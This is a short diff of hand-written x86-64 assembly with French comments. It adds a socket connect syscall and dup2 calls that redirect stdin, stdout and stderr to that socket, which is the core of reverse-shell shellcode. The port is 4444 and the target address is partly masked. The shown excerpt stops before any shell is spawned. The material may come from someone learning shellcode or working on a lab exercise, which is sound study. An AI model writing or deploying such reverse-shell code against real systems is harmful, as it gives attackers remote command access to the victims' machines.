@@ -21,7 +21,28 @@ mov rbx, 0x115c????
 push rbx
 mov rsi,rsp   ; rsi = pointeur vers sockaddr
 
+;connect
 mov rax, 0x2a ; syscall connect
 mov rdi, r12
 mov rdx, 16
+syscall
+
+;dup2 stdin, stdout, stderr
+
+;stdin
+mov rax, 0x21
+mov rdi, r12
+xor rsi, rsi   ;stdin : rsi = 0
+syscall
+
+;stdout
+mov rax, 0x21
+mov rdi, r12
+mov rsi, 1   ;stdout : rsi = 1
+syscall
+
+;stderr
+mov rax, 0x21
+mov rdi, r12
+mov rsi, 2   ;stderr : rsi = 2
 syscall
